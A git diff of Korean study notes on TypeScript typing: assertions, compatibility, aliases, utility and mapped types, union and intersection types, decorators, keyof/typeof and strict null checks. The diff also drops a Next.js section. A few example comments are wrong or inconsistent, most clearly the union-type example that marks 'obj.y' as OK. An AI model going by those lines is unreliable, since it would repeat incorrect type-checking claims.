+  타입 단언은 타입을 추론하지 못한 타입을 강제로 지정할 때 사용한다. as 키워드를 통해 타입 단언을 할 수 있다. 주의할 점은 잘못된 타입 단언은 컴파일 에러는 없지만 런타임 에러를 유발할 수 있으므로, 반드시 해당 값이 실제로 해당 타입임을 확신할 수 있을 때만 사용해야 한다. (ex API response type)
+
+- 예시
+
+  ```ts
+  // 예시 1. 변수의 복사
+  // 이 코드에서 a는 처음 선언 시 타입이 명시되지 않았기 때문에 any로 추론되고, b도 a의 타입을 그대로 따라가 any로 추론
+  var a;
+  a = 20;
+  var b = a as number;
+  ```
+
+  ```ts
+  // 예시 2. DOM API 조작
+  // getElementById는 HTMLElement | null을 반환하기 때문에 null이 아님을 확신할 수 있는 경우 as HTMLDivElement를 사용하여 타입 단언
+  const myDiv = document.getElementById("my-div") as HTMLDivElement;
+  myDiv.innerText = "Hello";
+  ```
 
 <br>
 
 ### # 타입 호환성
 
-<br>
+- 타입 호환성이란?
 
-- 타입 호환성이란 구조적 서브 타이핑을 기반으로 두 타입에 멤버만으로 타입이 호환되는지 판별하여 관계시키는 규칙이다. 타입 호환성을 통해 예상치 못한 에러를 방지하여 안정성을 향상시켰다. 타입 별 호환성 예시로는 인터페이스의 경우 객체 프로퍼티를 비교하고 함수의 경우 파라미터와 반환 타입 등을 비교하고 제네릭의 경우 전달받는 타입을 비교한다.
+  타입 호환성이란 구조적 타이핑(Structural Typing) 기반으로 두 타입 간 멤버 구조를 비교해 한쪽 타입을 다른 쪽에 할당 가능한지를 결정하는 규칙이다.
 
-  ```tsx
-  // (1) 인터페이스 호환성 예시
-  // 인터페이스 A와 B 정의
-  interface A {
-    x: number;
-  }
+- 예시
 
-  interface B {
-    x: number;
-    y: number;
-  }
+  - 인터페이스 호환성 예시
 
-  // A는 B로 할당 가능합니다. (넘치는건 가능)
-  let a: A = { x: 1 };
-  let b: B = a; // 가능
+    요구 타입을 모두 만족하는 경우 가능
 
-  // B는 A로 할당 불가능합니다. (부족한건 불가능)
-  let bb: B = { x: 1, y: 2 };
-  let aa: A = bb; // 오류! Property 'y'가 필요합니다.
-  ```
+    ```tsx
+    interface A {
+      x: number;
+    }
 
-  ```tsx
-  // (2) 함수 호환성 예시
-  type FuncA = (x: number) => number;
-  type FuncB = (x: number, y: number) => number;
+    interface B {
+      x: number;
+      y: number;
+    }
 
-  // FuncA는 FuncB로 할당 가능합니다. (매개변수가 적어지는건 가능)
-  let fnA: FuncA = (x) => x * 2;
-  let fnB: FuncB = fnA; // 가능
+    // A는 B로 할당 불가능 (요구 타입에 부족함)
+    const a: A = { x: 1 };
+    const b: B = a; // 오류! Property 'y'가 필요합니다.
 
-  // FuncB는 FuncA로 할당 불가능합니다.  (매개변수가 많아지는건 불가능)
-  let fnBB: FuncB = (x, y) => x + y;
-  let fnAA: FuncA = fnBB; // 오류! 불필요한 매개변수 'y'가 있습니다.
-  ```
+    // B는 A로 할당 가능 (요구 타입을 모두 가지고 있음)
+    const bb: B = { x: 1, y: 2 };
+    const aa: A = bb;
+    ```
 
-  ```tsx
-  // (3) 제네릭의 호환성 예시
-  interface Box<T> {
-    value: T;
-  }
+  - 함수 호환성 예시
 
-  let box1: Box<number>;
-  let box2: Box<string>;
+    매개변수가 적어지는건 가능, 함수 호출 시 매개변수를 초과하여 전달하여도 무시할 수 있으므로
 
-  box1 = box2; // 오류! 제네릭의 타입이 다르기 때문에 호환되지 않습니다.
+    ```tsx
+    type FuncA = (x: number) => number;
+    type FuncB = (x: number, y: number) => number;
 
-  // 하지만 제네릭 타입이 실제로 사용되는 경우에는 호환됩니다.
-  let numBox: Box<number>;
-  let anyBox: Box<any>;
+    // FuncA는 FuncB로 할당 가능 (필요한 매개변수가 적어지는건 가능)
+    // fnB(10, 20) 시 내부적으로 fnA가 호출되어 x=10, y=20은 무시됨
+    let fnA: FuncA = (x) => x * 2;
+    let fnB: FuncB = fnA; // 가능
 
-  numBox = anyBox; // 가능, 'any' 타입은 모든 타입과 호환됩니다.
-  ```
+    // FuncB는 FuncA로 할당 불가능  (필요한 매개변수가 많아지는건 불가능)
+    let fnBB: FuncB = (x, y) => x + y;
+    let fnAA: FuncA = fnBB;
+    ```
 
-<br>
+  - 제네릭의 호환성 예시
 
-### # strict 모드에서 null 에러
+    기본적으로 호환되지 않음, any 제외
 
-<br>
+    ```tsx
+    interface Box<T> {
+      value: T;
+    }
 
-- strict 모드 활성화 시 엄격하게 타입이 관리되어 null 타입 관련 문제가 발생할 수 있다. 타입 가드로 null 타입이 아닌 조건을 추가하여 해결할 수 있다. as 타입 단언, if문, 삼항연산자, 옵셔널체이닝, 논널 단언 연산자 등을 사용할 수 있다.
+    let box1: Box<number>;
+    let box2: Box<string>;
 
-  (1) as : const confirmedTotal = $('.confirmed-total') as HTMLSpanElement;
+    box1 = box2; // 오류! 제네릭의 타입이 다르기 때문에 호환되지 않습니다.
 
-  (2) if문 : if (!rankList) return; rankList.addEventListener('click', handleListClick);
+    // 하지만 제네릭 타입이 실제로 사용되는 경우에는 호환됩니다.
+    let numBox: Box<number>;
+    let anyBox: Box<any>;
 
-  (3) 삼항연산자 : selectedId = event.target.parentElement ? event.target.parentElement.id : undefined;
-
-  (4) 옵셔널체이닝 : deathsList?.appendChild(li)
-
-  (5) ! (Non-null assertion operator) : deathsList!.appendChild(li);
+    numBox = anyBox; // 가능, 'any' 타입은 모든 타입과 호환됩니다.
+    ```
 
 <br>
 
 ### # 타입 별칭(타입 앨리어스)
 
-<br>
-
-- 타입 별칭은 특정 타입에 별칭을 부여하여 새로운 타입을 만들어내는 타입이다. 인터페이스와 같은 객체 타입이나 원시 타입 혹은 값, 유니온 타입, 튜플 타입, 함수 타입 등을 지정할 수 있다.
+- 타입 별칭은 특정 타입에 별칭을 부여하여 새로운 타입을 만들어내는 타입이다. 인터페이스와 같은 객체 타입, 원시 타입, 유니온, 튜플, 함수 타입 등 모든 타입을 별칭으로 만들 수 있다.
 
   ```ts
   // 예시1 : 타입 앨리어스, 빈 객체를 Person 타입으로 지정
@@ -8794,148 +9016,232 @@ function infiniteAnimate(): never {
   type C = (name: string, age: number) => string;
   ```
 
+  ```ts
+  type A = { x: number };
+  type B = { y: string };
+
+  // 교차 타입을 사용해서 확장한 새로운 타입 만들기
+  type C = A & B;
+
+  const c: C = { x: 1, y: "hello" };
+  ```
+
 <br>
 
 ### # 타입 별칭과 인터페이스 차이
 
-(1) 확장 : 타입 별칭은 확장이 불가능하고 인터페이스는 확장이 가능하다.
+1. 확장성
 
-(2) 생성 타입 형태 : 타입 별칭은 객체 형태의 타입 외에도 원시 타입 혹은 값, 유니온 타입, 튜플 타입 등을 지정할 수 있고 인터페이스는 객체 형태의 타입을 지정한다.
+   타입 별칭은 직접적으로 확장(extends) 및 선언 병합이 불가능하고 인터페이스는 확장(extends) 및 선언 병합이 가능하다. 단 타입 별칭은 교차 선언을 통해 간접적으로 확장은 가능하다.
 
-(3) 프리뷰 : 타입 별칭은 프리뷰 시 타입의 구조를 모두 보여주고 인터페이스는 타입명을 보여준다.
+2. 생성 타입 형태
+
+   타입 별칭은 객체 형태의 타입 외에도 원시 타입 혹은 값, 유니온 타입, 튜플 타입 등을 지정할 수 있고 인터페이스는 객체 형태의 타입을 지정한다.
+
+3. 프리뷰
+
+   타입 별칭은 프리뷰 시 타입 전체 구조를 보여주고 인터페이스는 타입 명을 보여준다.
 
 <br>
 
 ### # 유틸리티 타입
 
-<br>
-
 - 유틸리티 타입이란?
 
   유틸리티 타입은 이미 정의해 놓은 타입을 변환하여 새로운 타입을 만들 때 사용하는 타입이다. 유틸리티 타입의 종류는 매우 다양하지만 대표적으로 파셜, 오밋, 픽 등의 타입이 있다.
 
-<br>
-
 - 자주 사용되는 유틸리티 타입
 
-  (1) 파셜(Partial) : 파셜 타입은 특정 타입의 부분 집합을 만족하는 타입을 정의한다. 파셜을 사용하면 옵셔널 속성의 남발을 막을 수 있다.
+  - 파셜(Partial)
 
-  ```ts
-  interface Address {
-    email: string;
-    address: string;
-  }
+    파셜 타입은 특정 타입의 부분 집합을 만족하는 타입을 정의한다. 파셜을 사용하면 옵셔널 속성의 남발을 막을 수 있다.
 
-  type MayHaveEmail = Partial<Address>;
-  const me: MayHaveEmail = {}; // 가능
-  const you: MayHaveEmail = { email: "test@abc.com" }; // 가능
-  const all: MayHaveEmail = { email: "capt@hero.com", address: "Pangyo" }; // 가능
-  ```
+    ```ts
+    interface Address {
+      email: string;
+      address: string;
+    }
 
-  (2) 픽(Pick) : 픽 타입은 특정 타입에서 몇 개의 속성을 선택하여 타입을 정의한다.
+    type MayHaveEmail = Partial<Address>;
+    const me: MayHaveEmail = {}; // 가능
+    const you: MayHaveEmail = { email: "test@abc.com" }; // 가능
+    const all: MayHaveEmail = { email: "capt@hero.com", address: "Pangyo" }; // 가능
+    ```
 
-  ```ts
-  interface Hero {
-    name: string;
-    skill: string;
-  }
-  const human: Pick<Hero, "name"> = {
-    name: "스킬이 없는 사람",
-  };
-  ```
+  - 픽(Pick)
 
-  (3) 오밋(Omit) : 오밋 타입은 픽과 반대로 특정 타입에서 지정된 속성만 제거한 타입을 정의한다.
+    픽 타입은 특정 타입에서 몇 개의 속성을 선택하여 타입을 정의한다.
 
-  ```ts
-  interface AddressBook {
-    name: string;
-    phone: number;
-    address: string;
-    company: string;
-  }
-  const phoneBook: Omit<AddressBook, "address"> = {
-    name: "재택근무",
-    phone: 12342223333,
-    company: "내 방",
-  };
-  const chingtao: Omit<AddressBook, "address" | "company"> = {
-    name: "중국집",
-    phone: 44455557777,
-  };
-  ```
+    ```ts
+    interface Hero {
+      name: string;
+      skill: string;
+    }
+
+    const human: Pick<Hero, "name"> = {
+      name: "스킬이 없는 사람",
+    };
+    ```
+
+  - 오밋(Omit)
+
+    오밋 타입은 픽과 반대로 특정 타입에서 지정된 속성만 제거한 타입을 정의한다.
+
+    ```ts
+    interface AddressBook {
+      name: string;
+      phone: number;
+      address: string;
+      company: string;
+    }
+
+    const phoneBook: Omit<AddressBook, "address"> = {
+      name: "재택근무",
+      phone: 12342223333,
+      company: "내 방",
+    };
+
+    const chingtao: Omit<AddressBook, "address" | "company"> = {
+      name: "중국집",
+      phone: 44455557777,
+    };
+    ```
 
 <br>
 
 ### # 맵드 타입
 
-<br>
-
 - 맵드 타입이란?
 
-  맵드 타입은 기존에 정의된 타입을 map 메소드와 같이 순회하여 새로운 타입을 정의한다. 마치 자바스크립트 map 메소드를 타입에 적용한 것과 같은 효과를 가진다.
+  맵드 타입(Mapped Types)은 keyof 연산자와 in 키워드를 이용해 기존 객체 타입의 모든 속성을 변환하여 새로운 타입을 생성하는 타입이다.
+  in 연산자를 활용하여 순회하며 in 연산자를 기준으로 좌항은 일반 변수(순회 대상이 순차적으로 반복 할당), 우항은 순회 대상(유니온 타입)이다.
+
+- 예시
+
+  - 예제1 : 기본 문법
+
+    ```ts
+    { [ P in K ] : T }
+    { [ P in K ] ? : T }
+    { readonly [ P in K ] : T }
+    { readonly [ P in K ] ? : T }
+    ```
+
+  - 예제2: 유니온 타입 기반 객체 정의
+
+    ```ts
+    type Heroes = "Hulk" | "Capt" | "Thor";
+    type HeroAges = { [K in Heroes]: number };
+
+    const ages: HeroAges = {
+      Hulk: 33,
+      Capt: 100,
+      Thor: 1000,
+    };
+    ```
+
+  - 예제3 : Partial 직접 구현
+
+    ```ts
+    // keyof T: Person의 키인 age, name을 유니온 타입으로 추출 -> "age" | "name"
+    // T[K]: T의 K 키에 해당하는 속성의 타입
+    type Subset<T> = {
+      [K in keyof T]?: T[K];
+    };
+
+    interface Person {
+      age: number;
+      name: string;
+    }
+
+    const ageOnly: Subset<Person> = { age: 23 };
+    const nameOnly: Subset<Person> = { name: "Tony" };
+    const ironman: Subset<Person> = { age: 23, name: "Tony" };
+    const empty: Subset<Person> = {};
+    ```
 
 <br>
 
-- 맵드 타입 사용법
+### # 유니온 타입, 인터섹션 타입
 
-  in 연산자를 활용하여 순회하며 in 연산자를 기준으로 좌항은 일반 변수, 우항은 순회 대상이다. 타입은 콜론 뒤에 지정해준다. 사용 예시로 유니온 타입을 순회하여 객체 타입을 정의하거나 인터페이스 타입을 순회하여 속성을 모두 옵셔널로 변경한 타입을 정의할 수 있다.
+- 유니온 타입 (|)
+
+  유니온 타입이란 OR 연산자와 같이 A이거나 B다를 의미하는 타입이다.
 
   ```ts
-  // 예제1 : 기본 문법
-  { [ P in K ] : T }
-  { [ P in K ] ? : T }
-  { readonly [ P in K ] : T }
-  { readonly [ P in K ] ? : T }
+  let value: string | number;
 
-  // 예제2 : 기본 예제
-  type Heroes = "Hulk" | "Capt" | "Thor";
-  type HeroAges = { [K in Heroes]: number };
-  const ages: HeroAges = {
-    Hulk: 33,
-    Capt: 100,
-    Thor: 1000,
+  value = "hello"; // ✅ 가능
+  value = 123; // ✅ 가능
+  value = true; // ❌ 오류 - boolean은 해당 안 됨
+  ```
+
+  ```ts
+  interface A {
+    x: number;
+    y: number;
+  }
+
+  interface B {
+    x: number;
+    z: number;
+  }
+
+  type AB = A | B;
+
+  const obj: AB = { x: 10, y: 20 }; //  A 혹은 B 타입으로 초기화 되어야 함, 해당 코드는 A 타입으로 초기화
+
+  // 공통된 속성 x만 접근 가능
+  console.log(obj.x); // OK
+  console.log(obj.y); // OK
+  console.log(obj.z); // Error
+  ```
+
+- 인터섹션 타입 (&)
+
+  인터섹션 타입은 AND 연산자와 같이 A와 B를 모두 만족하는 하나의 타입이다. 인터섹션 타입으로 인터페이스 타입 혹은 타입 별칭을 연결하는 경우 두 타입이 가진 모든 속성에 접근이 가능하다.
+
+  ```ts
+  type User = { name: string };
+  type Admin = { role: string };
+
+  type AdminUser = User & Admin;
+
+  const person: AdminUser = {
+    name: "Alice",
+    role: "manager",
+  };
+  ```
+
+  ```ts
+  interface A {
+    x: number;
+    y: number;
+  }
+
+  interface B {
+    z: string;
+  }
+
+  type AB = A & B;
+
+  const obj: AB = {
+    x: 10,
+    y: 20,
+    z: "hello",
   };
 
-  // 예제3 : 실용 예제, 맵드 타입인 Subset은 키와 값이 있는 객체를 정의하는 타입을 받아 그 객체의 부분 집합을 만족하는 타입으로 변환해주는 문법이다. key of의 경우 인터페이스 속성 키를 유니온 타입으로 반환한다. 예를 들면 Person과 같은 인터페이스가 있다고 할 때 Subset 타입을 적용하면 ageOnly, nameOnly, ironman, empty과 같은 객체를 모두 정의할 수 있다.
-
-  type Subset<T> = {
-    [K in keyof T]?: T[K];
-  }
-
-  interface Person {
-    age: number;
-    name: string;
-  }
-
-  const ageOnly: Subset<Person> = { age: 23 };
-  const nameOnly: Subset<Person> = { name: 'Tony' };
-  const ironman: Subset<Person> = { age: 23, name: 'Tony' };
-  const empty: Subset<Person> = {};
+  console.log(obj.x); // 10
+  console.log(obj.z); // hello
   ```
 
 <br>
 
-### # 유니온 타입 vs 인터섹션 타입
-
-<br>
-
-- 유니온 타입 (|) : 유니온 타입이란 OR 연산자와 같이 A이거나 B다를 의미하는 타입이다. 유니온 타입으로 인터페이스 타입 두 개를 연결하는 경우 공통 된 속성만 접근할 수 있다.
-
-<br>
-
-- 인터섹션 타입 (&) : 인터섹션 타입은 AND 연산자와 같이 A와 B를 모두 만족하는 하나의 타입이다. 인터섹션 타입으로 인터페이스 타입 두 개를 연결하는 경우 두 인터페이스가 가진 모든 속성에 접근이 가능하다.
-
-<br>
-
-### # **타입스크립트 데코레이터**
-
-<br>
+### # 타입스크립트 데코레이터
 
 - 데코레이터란?
 
   데코레이터가 붙은 클래스, 메소드(함수) 및 변수 등에 데코레이터에서 정의된 기능이 동작하는 것을 의미한다.
-
-<br>
 
 - 메소드 데코레이터 : 메서드의 기능을 확장하는 역할을 한다.
 
@@ -8953,8 +9259,6 @@ function infiniteAnimate(): never {
   const person = new Person();
   person.hello();
   ```
-
-<br>
 
 - 프로퍼티 데코레이터 : 클래스의 프로퍼티 선언에 사용되는 프로퍼티 데코레이터는 두 개의 인자를 받는다. 그리고 프로퍼티 데코레이터에서 Property Descriptor 형식으로 객체를 반환할 때는, 프로퍼티에 적용이 된다.
 
@@ -8981,8 +9285,6 @@ function infiniteAnimate(): never {
   person.name = "zz";
   console.log(person.name);
   ```
-
-<br>
 
 - 파라미터 데코레이터 : 파라미터 안에 들어가는 파라미터 데코레이터는 3개의 인자를 받는다.
 
@@ -9014,42 +9316,47 @@ function infiniteAnimate(): never {
 
 <br>
 
-### # **타입스크립트가 실행되는 과정**
+### # 타입스크립트 실행 과정
+
+- 2-4번은 타입 스크립트 컴파일러(TSC)가 수행, 5-7번은 브라우저, NodJS, 기타 자바스크립트 엔진 같은 자바스크립트 런타임이 실행
+
+  1. 소스 코드 작성 : 프로그래머가 타입스크립트 코드 작성
+
+  2. 파싱 : 타입스크립트 컴파일러가 소스 코드를 읽어 추상 문법 트리(AST)로 변환
+
+  3. 타입 검사 : 타입스크립트 컴파일러가 추상 문법 트리(AST)를 기반으로 타입 규칙을 검사하여 오류 체크
+
+  4. 트랜스 파일 : 타입 정보는 제거하고 타입스크립트 코드를 순수한 자바스크립트로 변환
+
+  5. 런타임(자바스크립트 엔진) 실행 준비 : 브라우저, Nodejs 기타 자바스크립트 엔진이 코드를 받아서 다시 파싱 -> 추상 구문 트리 생성
+
+  6. 바이트 코드 변환 및 최적화 : 자바스크립트 엔진 내부에서 추상 구문 트리를 바이트 코드 등 저수준 코드로 변환
+
+  7. 코드 실행 : 런타임이 바이트 코드를 실행한다.
 
 <br>
 
-- 2-4번은 TSC가 수행, 5-7번은 브라우저, NodJS, 기타 자바스크립트 엔진 같은 자바스크립트 런타임이 실행
+### # keyof와 typeof
 
-  (1) 소스 코드 작성 by 프로그래머
+- keyof 타입
 
-  (2) 타입스크립트 소스 코드를 파싱하여 AST (추상문법트리)로 변환
-
-  (3) 타입 검사기가 AST를 확인 (여기서 타입 검사가 이루어짐)
-
-  (4) 컴파일러가 AST를 bytecode가 아닌 JavaScript로 변환한다.
-
-  (5) JavaScript 소스를 AST로 변환
-
-  (6) AST -> 바이트코드
-
-  (7) 런타임이 바이트코드를 평가
-
-<br>
-
-### # **keyof와 typeof**
-
-- keyof `example` : `example`의 모든 프로퍼티의 키값을 union 형태로 반환, “T extends keyof 인터페이스명”을 통해서 인터페이스의 있는 한 가지만 제네릭으로 설정한다. 인터페이스 내부의 key값으로 제네릭의 범위를 제한하는 것이다.
-
-<br>
-
-- typeof `example` : `example`(변수/함수등)의 type을 반환, enum 타입과 같은 객체를 반환하는 타입에 사용하면 이 객체 자체가 타입이 된다.
-
-<br>
-
-- 예제
+  타입(인터페이스, 객체 타입 등)의 모든 프로퍼티 키를 유니온 타입으로 추출한다.
 
   ```ts
-  // 예제1 : enum
+  interface BrandInterface {
+    Nike: "nike";
+    Adidas: "adidas";
+    Puma: "puma";
+  }
+
+  let type: keyof BrandInterface; // 마우스 오버 시 : 'Nike' | 'Adidas' | 'Puma'
+  ```
+
+- typeof 변수명
+
+  변수나 객체, 함수 등의 값(value) 에 대해 그 타입을 추출한다. 즉, typeof 변수명은 해당 변수의 타입을 가져오는 역할이다.
+
+  ```ts
   enum BrandEnum {
     Nike = "nike",
     Adidas = "adidas",
@@ -9060,31 +9367,13 @@ function infiniteAnimate(): never {
     Nike: BrandEnum.Nike,
     Adidas: BrandEnum.Adidas,
     puma: BrandEnum.puma,
-  }; // 마우스 오버 시 : let type1: typeof BrandEnum
-  let type2: keyof BrandEnum; // 마우스 오버 시 : let type2: number | typeof Symbol.iterator | "toString" | "charAt" ...
-  let type3: keyof typeof BrandEnum; // 마우스 오버 시 : let type3: "Nike" | "Adidas" | "Puma"
+  }; // let type1: typeof BrandEnum
+  let type2: keyof BrandEnum; // number | typeof Symbol.iterator | "toString" | "charAt" ...
+  let type3: keyof typeof BrandEnum; // let type3: "Nike" | "Adidas" | "Puma"
   ```
 
-  type1은 마우스를 올려보면 typeof BrandEnum가 찍힌다. enum은 객체로 변환되기 때문에 typeof를 사용하게 되면 그냥 그 객체 자체가 type이 되어버려 똑같이 사용해야만 한다. 그럼 이 typeof 를 했을 때 만들어진 type이 interface와 비슷하다고 생각된다.
-  type2의 마우스를 올려보면 객체의 프로퍼티들이 찍히는걸 볼 수 있다. Brand가 Object이기 때문에 나오는 것이다.
-  type3은 typeof Brand가 enum 객체 그 자체이고 그것의 key들을 뽑아냈기 때문에 key값이 유니온으로 반환된다.
-
   ```ts
-  // 예제2 : interface
-  interface BrandInterface {
-    Nike: "nike";
-    Adidas: "adidas";
-    Puma: "puma";
-  }
-
-  let type: keyof BrandInterface; // 마우스 오버 시 : 'Nike' | 'Adidas' | 'Puma'
-  ```
-
-  이런식으로 작성하고 type에 마우스를 올려보면 아까 위와 똑같이 'Nike' | 'Adidas' | 'Puma'로 나오는것을 확인할 수 있다.
-  즉, enum의 keyof typeof는 interface의 keyof와 똑같다고 볼 수 있을 것 같다. enum은 객체이기 때문에 keyof만 했을 때는 객체의 key들이 나오고 keyof typeof를 했을 때 원하는 값이 나왔다. interface는 객체가 아니기 때문에 keyof만 했을 때도 바로 원하는 값이 나온다.
-
-  ```ts
-  // 예제3 : 객체
+  // 객체의 경우에도 enum과 똑같이 작동하는 것을 볼 수 있었다. 즉 enum 객체로 변환 되기 때문이다. typeof으로 타입을 얻은 뒤 keyof로 추출한다.
   const object = {
     Nike: "nike",
     Adidas: "adidas",
@@ -9094,109 +9383,88 @@ function infiniteAnimate(): never {
   let type: keyof typeof object;
   ```
 
-  객체의 경우에도 enum과 똑같이 작동하는 것을 볼 수 있었다. 즉 enum 객체로 변환 되기 때문이다.
-
 <br>
 
-### # **any와 Generic 차이**
+### # any와 Generic 차이
 
-<br>
+1. 반환 타입 유추
 
-(1) 반환 타입 유추 : 함수의 any타입의 경우 함수의 반환 타입을 알기 어렵지만 제네릭 타입의 경우 호출 시 명시적으로 타입을 선언해줌으로서 반환 타입을 유추하기 쉽다.
+   함수의 any타입의 경우 함수의 반환 타입을 알기 어렵지만 제네릭 타입의 경우 호출 시 명시적으로 타입을 선언해줌으로서 반환 타입을 유추하기 쉽다.
 
-```ts
-// any 타입
-function AnyReturnFunc(arg: any): any {
-  return arg;
-}
+   ```ts
+   // any 타입
+   function AnyReturnFunc(arg: any): any {
+     return arg;
+   }
 
-let numVar = AnyReturnFunc(123); // number 타입의 값인 123을 전달하였지만, 무슨 타입을 return 받는지 유추하기 어려움
-let strVar = AnyReturnFunc("ABC"); // // number 타입의 값인 123을 전달하였지만, 무슨 타입을 return 받는지 유추하기 어려움
+   let numVar = AnyReturnFunc(123); // number 타입의 값인 123을 전달하였지만, 무슨 타입을 return 받는지 유추하기 어려움
+   let strVar = AnyReturnFunc("ABC"); // // number 타입의 값인 123을 전달하였지만, 무슨 타입을 return 받는지 유추하기 어려움
 
-// Generic 타입
-function GenericReturnFunc<T>(arg: T): T {
-  return arg;
-}
+   // Generic 타입
+   function GenericReturnFunc<T>(arg: T): T {
+     return arg;
+   }
 
-let numVar = GenericReturnFunc<number>(123); // 명시적인 타입 선언 사용, 반환 값을 유추할 수 있다.
-```
+   let numVar = GenericReturnFunc<number>(123); // 명시적인 타입 선언 사용, 반환 값을 유추할 수 있다.
+   ```
 
-(2) 프로퍼티 체크 : 함수의 any 타입은 매개변수의 프로퍼티를 체크하지 않고 제네릭 타입은 프로퍼티를 체크하므로 타입가드가 필요하기 때문에 사전에 에러를 방지할 수 있다.
+2. 프로퍼티 체크 유무
 
-```ts
-function AnyReturnFunc(arg: any): any {
-  return arg.length; // 에러가 발생하지 않는다.
-}
+   함수의 any 타입은 매개변수의 프로퍼티를 체크하지 않고 제네릭 타입은 프로퍼티를 체크하므로 타입가드가 필요하기 때문에 사전에 에러를 방지할 수 있다.
 
-function GenericReturnFunc<T>(arg: T): T {
-  return arg.length; // 제네릭 함수는 무슨 타입이 올지 모르기 때문에 length 프로퍼티를 사용할 수 없다는 에러 메시지를 노출한다.
-}
-```
+   ```ts
+   function AnyReturnFunc(arg: any): any {
+     return arg.length; // 에러가 발생하지 않는다.
+   }
+
+   function GenericReturnFunc<T>(arg: T): T {
+     return arg.length; // 제네릭 함수는 무슨 타입이 올지 모르기 때문에 length 프로퍼티를 사용할 수 없다는 에러 메시지를 노출한다.
+   }
+   ```
 
 <br>
 
 ### # 타입스크립트 설정 파일 (tsconfig.json)
 
-<br>
+- tsconfig.json은 타입스크립트 컴파일러의 설정을 정의하는 파일이다. 이 파일에서 컴파일 옵션, strict 모드 설정, 타입 검사 규칙, 출력 경로 등 다양한 컴파일 규칙과 동작 방식을 지정할 수 있다.
 
-- 타입스크립트 설정 파일은 타입스크립트 컴파일 규칙을 정의하는 파일이다. 컴파일 규칙 이 외에도 strict 모드 관련 규칙, 타입 작성 규칙 등을 설정할 수 있다.
+- tsconfig.json에서 strict: true 설정
 
-<br><br><br>
+  기본적으로 타입스크립트에서는 null과 undefined가 모든 타입의 하위 타입으로 간주되어서, 아무 변수나 null 또는 undefined 값을 가질 수 있다. strictNullChecks가 켜지면, null과 undefined는 오직 그 타입으로 명시적으로 지정된 변수에만 할당 가능하다. 즉, string 타입 변수에는 null이나 undefined를 할당할 수 없고, string | null 처럼 유니언 타입으로 명시해야만 할당할 수 있다.
 
-## # Next.js
+  ```ts
+  let name: string = "Alice";
+  name = null; // 오류! 'null'은 'string' 타입에 할당 불가
 
-<br>
+  let age: number | null = null; // 가능: null을 포함하는 유니언 타입
+  ```
 
-### # 클라이언트 컴포넌트와 서버 컴포넌트 (수정 필요)
+  ```ts
+  interface User {
+    id: number;
+    name: string;
+    email?: string | null; // 이메일은 optional이고 null일 수도 있다
+  }
 
-- 클라이언트 컴포넌트
+  async function fetchUser(id: number): Promise<User | null> {
+    const response = await fetch(`/api/user/${id}`);
+    if (!response.ok) return null;
+    return await response.json();
+  }
 
-  - 역할
+  async function showUser(id: number) {
+    const user = await fetchUser(id);
 
-  - 렌더링 과정
-
-    1. 기본적으로 서버 사이드 렌더링(SSR)을 수행한다. 초기 페이지 접근 시나 새로고침 시 서버에서 HTML을 렌더링하고, 클라이언트는 그 HTML을 하이드레이션하여 상호작용할 수 있도록 만든다.
-    2. 클라이언트 사이드 라우팅 시에는 클라이언트 CSR을 수행한다. 클라이언트 컴포넌트는 React Element 객체(JSX로 작성된 React 컴포넌트)를 반환하며, 해당 객체는 Virtual DOM에 Fiber로 확장된다. 이후, Fiber를 통해 Virtual DOM을 생성하고, 이를 바탕으로 실제 DOM을 변환한다.
-
-  - 언제 사용하나요?
-
-    1. 상호작용이 필요한 UI 요소가 있을 때.
-    2. 애니메이션이나 동적 UI 업데이트가 필요한 경우.
-
-- 서버 컴포넌트
-
-  - 역할
-
-    1. 이벤트 핸들러나 React 내장 훅(useState, useEffect)을 사용할 수 없습니다.
-    2. 서버에서 데이터 fetching을 처리하여, API나 데이터베이스와 연결하고, 서버에서 데이터를 미리 가져와 HTML을 생성합니다. 이 방식은 클라이언트의 데이터 요청을 줄이고 성능을 최적화하는 데 도움을 줍니다.
-
-  - 렌더링 과정
-
-    - 서버 측
-
-      1. 리액트 서버에서 서버 컴포넌트를 RSC payload로 렌더링한다. RSC payload는 서버 컴포넌트의 렌더링 결과, 플레이스홀더 (클라이언트 컴포넌트의 렌더링 되는 위치에 대한 빈자리 표시와 필요한 js 파일에 대한 참조), 서버 컴포넌트가 클라이언트 컴포넌트에 전달하는 props를 가지고 있다.
-      2. nextjs 서버에서는 해당 rsc payload와 클라이언트 컴포넌트 자바스크립트 인스트럭션(최소한의 js, 예를 들면 state의 초기 값)을 조합하여 정적인 HTML을 생성한다. 여기까지가 서버에서의 동작이다.
-
-    - 클라이언트 측
-
-      3. 서버에서 생성한 HTML을 전달받아 즉시 보여준다. 다만 초기 라우팅, 즉 서버 사이드 라우팅인 경우만 이 HTML을 활용한다. 이후 클라이언트 사이드 라우팅인 경우에는 활용하지 않는다.
-      4. 재조정(reconcile)한다. 재조정이란 클라이언트 컴포넌트와 서버 컴포넌트 트리를 구성하는데 이것이 리액트 컴포넌트 트리이며 이 리액트 컴포넌트 트리(버츄얼 돔)에서 클라이언트 컴포넌트 트리에 빈자리(플레이스홀더)를 RSC payload에 포함되어있는 플레이스홀더 정보를 활용하여 채워주는데 이 과정을 재조정이라고 한다.
-      5. 재조정을 통해 버츄얼 돔 클라이언트 컴포넌트 트리에 빈자리를 채운 뒤 인터렉션이 가능하도록 하이드레이션(수화)한다. 하이드레이션 시에는 서버에서와 마찬가지로 클라이언트 컴포넌트 자바스크립트 인스트럭션을 활용하는데 다른 점은 정적인 최소한의 js가 아닌 setState나 이벤트 핸들러 등과 같이 동적인 자바스크립트 인스트럭션(해당 자바스크립트 인스트럭션은 웹팩을 통해 쪼개진 js 청크이다. 네트워크를 통해 클라이언트, 즉 브라우저에서 전달받는다.)을 활용해서 하이드레이션하여 정적인 HTML이 인터렉션이 가능하도록 한다. (JavaScript instructions로 클라이언트 컴포넌트만 hydration 한다)
-
-  - 언제 사용하나?
-    1. 비상호작용적인 콘텐츠를 렌더링할 때.
-    2. 서버에서 데이터 fetching을 처리할 때.
-    3. SEO 최적화를 고려할 때.
-    4. 정적 콘텐츠나 대규모 데이터 처리가 필요할 때.
-
-- 검증해야할 점
-  - https://nextjs.org/docs/app/building-your-application/rendering/client-components 해당 공식문서를 보면 클라이언트 컴포넌트는 초기 방문, 새로고침 등에서 서버 컴포넌트 렌더링 과정과 거의 흡사하게 렌더링된다. 왜 그런지 찾아봐야겠다.. 또한 서버 컴포넌트는 서버 사이드 라우팅인 경우만 정적인 HTML을 사용하는데 이유가 뭘까.. 즉 두 컴포넌트가 거의 동일하게 동작하는데 차이점은 정확히 뭘까..
-    - 서버 컴포넌트만 사용하는 경우 하이드레이션 과정이 없다.
